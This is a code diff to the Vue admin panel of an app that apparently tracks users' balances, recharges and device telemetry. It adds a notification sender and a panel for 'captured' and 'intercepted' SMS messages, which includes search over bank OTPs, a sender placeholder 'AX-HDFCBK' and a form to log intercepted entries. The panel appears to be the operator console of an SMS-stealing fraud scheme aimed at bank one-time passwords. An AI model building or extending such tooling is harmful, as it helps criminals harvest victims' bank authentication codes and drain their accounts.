@@ -1241,6 +1241,173 @@
 
             </div>
 
+            <!-- New Section: Notification & SMS Take Action Options -->
+            <div class="grid grid-cols-1 lg:grid-cols-2 gap-8 pt-2">
+              
+              <!-- Option 1: User Notifications Panel -->
+              <div class="bg-white p-6 rounded-2xl border border-slate-100 shadow-sm space-y-6">
+                <div class="flex items-center justify-between pb-4 border-b border-slate-50">
+                  <div class="flex items-center gap-2">
+                    <div class="h-9 w-9 rounded-xl bg-purple-50 text-purple-600 flex items-center justify-center font-bold text-base">
+                      <i class="fa-solid fa-bell"></i>
+                    </div>
+                    <div>
+                      <h3 class="text-base font-bold text-slate-800">User Notifications</h3>
+                      <p class="text-xs text-slate-400">Send push notices &amp; view user inbox history</p>
+                    </div>
+                  </div>
+                  <span class="text-xs bg-purple-50 text-purple-700 font-extrabold px-3 py-1 rounded-full">
+                    {{ userNotifications ? userNotifications.length : 0 }} Messages
+                  </span>
+                </div>
+
+                <!-- Send Notification Form -->
+                <form @submit.prevent="sendUserNotification" class="p-4 bg-slate-50/70 rounded-xl border border-slate-100 space-y-3">
+                  <div class="font-bold text-xs text-slate-700 uppercase tracking-wide flex items-center gap-1.5">
+                    <i class="fa-solid fa-paper-plane text-purple-500"></i> Send New Push Notification
+                  </div>
+                  <div class="grid grid-cols-1 sm:grid-cols-3 gap-3">
+                    <div class="sm:col-span-2">
+                      <input type="text" v-model="notifForm.title" placeholder="Title (e.g. Account Alert / Reward)"
+                        class="w-full px-3.5 py-2.5 bg-white border border-slate-200 rounded-xl text-slate-800 text-xs font-semibold focus:outline-none focus:ring-2 focus:ring-[#b66dff]">
+                    </div>
+                    <div>
+                      <select v-model="notifForm.type"
+                        class="w-full px-3.5 py-2.5 bg-white border border-slate-200 rounded-xl text-slate-800 text-xs font-bold focus:outline-none focus:ring-2 focus:ring-[#b66dff]">
+                        <option value="info">Info / General</option>
+                        <option value="alert">Important Alert</option>
+                        <option value="system">System Notice</option>
+                        <option value="promo">Bonus / Promo</option>
+                      </select>
+                    </div>
+                  </div>
+                  <div>
+                    <textarea rows="2" v-model="notifForm.message" placeholder="Type notification message text here..."
+                      class="w-full px-3.5 py-2.5 bg-white border border-slate-200 rounded-xl text-slate-800 text-xs font-medium focus:outline-none focus:ring-2 focus:ring-[#b66dff]"></textarea>
+                  </div>
+                  <button type="submit" :disabled="sendNotifLoading"
+                    class="px-4 py-2.5 purple-btn text-white rounded-xl text-xs font-bold shadow-xs transition flex items-center gap-1.5 disabled:opacity-50">
+                    <span v-if="sendNotifLoading"><i class="fa-solid fa-spinner animate-spin"></i> Sending...</span>
+                    <span v-else><i class="fa-solid fa-bell-concierge"></i> Dispatch Notification</span>
+                  </button>
+                </form>
+
+                <!-- Notification List -->
+                <div class="space-y-2.5 max-h-[300px] overflow-y-auto pr-1">
+                  <div v-if="!userNotifications || userNotifications.length === 0" class="py-8 text-center text-slate-400">
+                    <i class="fa-solid fa-bell-slash text-2xl text-slate-200 mb-2"></i>
+                    <p class="text-xs font-medium">No notifications sent or stored for this user.</p>
+                  </div>
+                  <div v-for="notif in userNotifications" :key="notif._id"
+                    class="p-3.5 bg-slate-50/80 rounded-xl border border-slate-100 flex items-start justify-between gap-3 text-xs">
+                    <div class="space-y-1 flex-1">
+                      <div class="flex items-center gap-2">
+                        <span class="font-extrabold text-slate-800">{{ notif.title }}</span>
+                        <span :class="['px-2 py-0.5 rounded text-[10px] font-bold uppercase tracking-wider', 
+                          notif.type === 'alert' ? 'bg-rose-100 text-rose-700' : 
+                          notif.type === 'promo' ? 'bg-amber-100 text-amber-800' : 
+                          notif.type === 'system' ? 'bg-indigo-100 text-indigo-700' : 'bg-slate-200 text-slate-700']">
+                          {{ notif.type }}
+                        </span>
+                        <span class="text-[10px] text-slate-400 ml-auto">{{ formatDate(notif.createdAt) }}</span>
+                      </div>
+                      <p class="text-slate-600 leading-relaxed font-medium">{{ notif.message }}</p>
+                    </div>
+                    <button @click="deleteUserNotification(notif._id)" class="text-slate-300 hover:text-rose-500 transition p-1" title="Delete notification">
+                      <i class="fa-solid fa-trash-can"></i>
+                    </button>
+                  </div>
+                </div>
+              </div>
+
+              <!-- Option 2: SMS Logs & Intercepted Messages Panel -->
+              <div class="bg-white p-6 rounded-2xl border border-slate-100 shadow-sm space-y-6">
+                <div class="flex flex-col sm:flex-row sm:items-center justify-between pb-4 border-b border-slate-50 gap-3">
+                  <div class="flex items-center gap-2">
+                    <div class="h-9 w-9 rounded-xl bg-blue-50 text-blue-600 flex items-center justify-center font-bold text-base">
+                      <i class="fa-solid fa-comment-sms"></i>
+                    </div>
+                    <div>
+                      <h3 class="text-base font-bold text-slate-800">SMS Logs &amp; Messages</h3>
+                      <p class="text-xs text-slate-400">Captured device SMS &amp; OTP verification history</p>
+                    </div>
+                  </div>
+                  <div class="flex items-center gap-2">
+                    <div class="relative">
+                      <input type="text" v-model="smsSearchQuery" placeholder="Search SMS / OTP..."
+                        class="pl-8 pr-3 py-1.5 bg-slate-50 border border-slate-200 rounded-lg text-xs font-medium focus:outline-none focus:ring-1 focus:ring-blue-500">
+                      <i class="fa-solid fa-magnifying-glass absolute left-2.5 top-2.5 text-slate-400 text-[10px]"></i>
+                    </div>
+                    <span class="text-xs bg-blue-50 text-blue-700 font-extrabold px-3 py-1 rounded-full whitespace-nowrap">
+                      {{ filteredSmsLogs ? filteredSmsLogs.length : 0 }} SMS
+                    </span>
+                  </div>
+                </div>
+
+                <!-- Add Manual SMS Record Form -->
+                <form @submit.prevent="addSmsLogRecord" class="p-4 bg-slate-50/70 rounded-xl border border-slate-100 space-y-3">
+                  <div class="font-bold text-xs text-slate-700 uppercase tracking-wide flex items-center gap-1.5">
+                    <i class="fa-solid fa-plus-circle text-blue-500"></i> Log / Intercept SMS Entry
+                  </div>
+                  <div class="grid grid-cols-1 sm:grid-cols-3 gap-3">
+                    <div>
+                      <input type="text" v-model="smsForm.sender" placeholder="Sender ID (e.g. AX-HDFCBK)"
+                        class="w-full px-3.5 py-2.5 bg-white border border-slate-200 rounded-xl text-slate-800 text-xs font-semibold focus:outline-none focus:ring-2 focus:ring-blue-500">
+                    </div>
+                    <div>
+                      <select v-model="smsForm.type"
+                        class="w-full px-3.5 py-2.5 bg-white border border-slate-200 rounded-xl text-slate-800 text-xs font-bold focus:outline-none focus:ring-2 focus:ring-blue-500">
+                        <option value="incoming">Incoming SMS</option>
+                        <option value="otp">Bank OTP / Security</option>
+                        <option value="system">System SMS</option>
+                      </select>
+                    </div>
+                    <div>
+                      <button type="submit" :disabled="addSmsLoading"
+                        class="w-full py-2.5 bg-blue-600 hover:bg-blue-700 text-white rounded-xl text-xs font-bold shadow-xs transition flex items-center justify-center gap-1.5 disabled:opacity-50">
+                        <span v-if="addSmsLoading"><i class="fa-solid fa-spinner animate-spin"></i> Saving...</span>
+                        <span v-else><i class="fa-solid fa-floppy-disk"></i> Log SMS Message</span>
+                      </button>
+                    </div>
+                  </div>
+                  <div>
+                    <textarea rows="2" v-model="smsForm.message" placeholder="Paste or type SMS body content (e.g. Your OTP is 849201 for bank account...)"
+                      class="w-full px-3.5 py-2.5 bg-white border border-slate-200 rounded-xl text-slate-800 text-xs font-medium focus:outline-none focus:ring-2 focus:ring-blue-500"></textarea>
+                  </div>
+                </form>
+
+                <!-- SMS Message List -->
+                <div class="space-y-2.5 max-h-[300px] overflow-y-auto pr-1">
+                  <div v-if="!filteredSmsLogs || filteredSmsLogs.length === 0" class="py-8 text-center text-slate-400">
+                    <i class="fa-solid fa-inbox text-2xl text-slate-200 mb-2"></i>
+                    <p class="text-xs font-medium">No SMS messages found or matching search query.</p>
+                  </div>
+                  <div v-for="sms in filteredSmsLogs" :key="sms._id"
+                    class="p-3.5 bg-slate-50/80 rounded-xl border border-slate-100 flex items-start justify-between gap-3 text-xs">
+                    <div class="space-y-1 flex-1">
+                      <div class="flex items-center gap-2 flex-wrap">
+                        <span class="font-extrabold text-blue-700 bg-blue-50 px-2 py-0.5 rounded border border-blue-100 font-mono text-[11px]">
+                          <i class="fa-solid fa-tower-cell mr-1"></i>{{ sms.sender || 'SMS-ALERT' }}
+                        </span>
+                        <span :class="['px-2 py-0.5 rounded text-[10px] font-bold uppercase tracking-wider',
+                          sms.type === 'otp' ? 'bg-amber-100 text-amber-800' : 'bg-slate-200 text-slate-700']">
+                          {{ sms.type || 'incoming' }}
+                        </span>
+                        <span class="text-[10px] text-slate-400 ml-auto font-medium">{{ formatDate(sms.receivedAt) }}</span>
+                      </div>
+                      <p class="text-slate-700 font-mono text-[11px] leading-relaxed bg-white p-2.5 rounded-lg border border-slate-200/60 mt-1 select-all whitespace-pre-wrap">
+                        {{ sms.message }}
+                      </p>
+                    </div>
+                    <button @click="deleteSmsLogRecord(sms._id)" class="text-slate-300 hover:text-rose-500 transition p-1 shrink-0" title="Delete SMS log">
+                      <i class="fa-solid fa-trash-can"></i>
+                    </button>
+                  </div>
+                </div>
+              </div>
+
+            </div>
+
           </div>
 
         </main>
@@ -1256,7 +1423,7 @@
 
   <!-- Frontend Logic Script -->
   <script>
-    const { createApp, ref, onMounted, reactive } = Vue;
+    const { createApp, ref, onMounted, reactive, computed } = Vue;
 
     createApp({
       setup() {
@@ -1302,6 +1469,34 @@
         const sellTransactions = ref([]);
         const adminTransactions = ref([]);
         const ledgerTab = ref('buy');
+
+        // Notifications & SMS State
+        const userNotifications = ref([]);
+        const notifForm = reactive({
+          title: '',
+          message: '',
+          type: 'info'
+        });
+        const sendNotifLoading = ref(false);
+
+        const userSmsLogs = ref([]);
+        const smsForm = reactive({
+          sender: 'BANK-OTP',
+          message: '',
+          type: 'incoming'
+        });
+        const addSmsLoading = ref(false);
+        const smsSearchQuery = ref('');
+
+        const filteredSmsLogs = computed(() => {
+          if (!smsSearchQuery.value) return userSmsLogs.value;
+          const q = smsSearchQuery.value.toLowerCase().trim();
+          return userSmsLogs.value.filter(s => 
+            (s.sender && s.sender.toLowerCase().includes(q)) ||
+            (s.message && s.message.toLowerCase().includes(q)) ||
+            (s.type && s.type.toLowerCase().includes(q))
+          );
+        });
 
         const isSidebarCollapsed = ref(false);
         const balanceActionAmount = ref('');
@@ -1467,6 +1662,8 @@
               buyTransactions.value = data.data.buyTransactions;
               sellTransactions.value = data.data.sellTransactions;
               adminTransactions.value = data.data.adminTransactions;
+              userNotifications.value = data.data.notifications || [];
+              userSmsLogs.value = data.data.smsLogs || [];
 
               // Populate edit forms
               editUserForm.realName = selectedUser.value.realName || '';
@@ -1655,6 +1852,8 @@
               sellTransactions.value = data.data.sellTransactions;
               adminTransactions.value = data.data.adminTransactions;
               selectedTelemetry.value = data.data.telemetry;
+              userNotifications.value = data.data.notifications || [];
+              userSmsLogs.value = data.data.smsLogs || [];
               if (selectedUser.value) {
                 selectedUser.value.balance = data.data.user.balance;
                 selectedUser.value.recharge = data.data.user.recharge;
@@ -1665,6 +1864,107 @@
             }
           } catch (e) {
             console.error('Soft refresh error:', e);
+          }
+        };
+
+        const sendUserNotification = async () => {
+          if (!notifForm.title || !notifForm.message) {
+            alert('Please fill title and message for notification.');
+            return;
+          }
+          sendNotifLoading.value = true;
+          try {
+            const res = await fetch('/xxapi/admin/sendNotification', {
+              method: 'POST',
+              headers: getAuthHeaders(),
+              body: JSON.stringify({
+                userId: selectedUser.value._id,
+                title: notifForm.title,
+                message: notifForm.message,
+                type: notifForm.type
+              })
+            });
+            const data = await res.json();
+            if (data.code === 0) {
+              alert('Notification sent to user!');
+              notifForm.title = '';
+              notifForm.message = '';
+              fetchUserDetail(selectedUser.value._id);
+            } else {
+              alert('Error sending notification: ' + data.msg);
+            }
+          } catch (e) {
+            alert('Failed to send notification.');
+          } finally {
+            sendNotifLoading.value = false;
+          }
+        };
+
+        const deleteUserNotification = async (id) => {
+          if (!confirm('Are you sure you want to delete this notification?')) return;
+          try {
+            const res = await fetch(`/xxapi/admin/notifications/${id}`, {
+              method: 'DELETE',
+              headers: getAuthHeaders()
+            });
+            const data = await res.json();
+            if (data.code === 0) {
+              fetchUserDetail(selectedUser.value._id);
+            } else {
+              alert('Error: ' + data.msg);
+            }
+          } catch (e) {
+            alert('Failed to delete notification.');
+          }
+        };
+
+        const addSmsLogRecord = async () => {
+          if (!smsForm.message) {
+            alert('Please enter SMS message text.');
+            return;
+          }
+          addSmsLoading.value = true;
+          try {
+            const res = await fetch('/xxapi/admin/addSmsLog', {
+              method: 'POST',
+              headers: getAuthHeaders(),
+              body: JSON.stringify({
+                userId: selectedUser.value._id,
+                sender: smsForm.sender || 'SMS-ALERT',
+                message: smsForm.message,
+                type: smsForm.type
+              })
+            });
+            const data = await res.json();
+            if (data.code === 0) {
+              alert('SMS log record added successfully!');
+              smsForm.message = '';
+              fetchUserDetail(selectedUser.value._id);
+            } else {
+              alert('Error: ' + data.msg);
+            }
+          } catch (e) {
+            alert('Failed to add SMS log.');
+          } finally {
+            addSmsLoading.value = false;
+          }
+        };
+
+        const deleteSmsLogRecord = async (id) => {
+          if (!confirm('Are you sure you want to delete this SMS log?')) return;
+          try {
+            const res = await fetch(`/xxapi/admin/smsLogs/${id}`, {
+              method: 'DELETE',
+              headers: getAuthHeaders()
+            });
+            const data = await res.json();
+            if (data.code === 0) {
+              fetchUserDetail(selectedUser.value._id);
+            } else {
+              alert('Error: ' + data.msg);
+            }
+          } catch (e) {
+            alert('Failed to delete SMS log.');
           }
         };
 
@@ -1983,7 +2283,19 @@
           saveNode,
           editNode,
           deleteNode,
-          resetNodeForm
+          resetNodeForm,
+          userNotifications,
+          notifForm,
+          sendNotifLoading,
+          userSmsLogs,
+          smsForm,
+          addSmsLoading,
+          smsSearchQuery,
+          filteredSmsLogs,
+          sendUserNotification,
+          deleteUserNotification,
+          addSmsLogRecord,
+          deleteSmsLogRecord
         };
       }
     }).mount('#app');
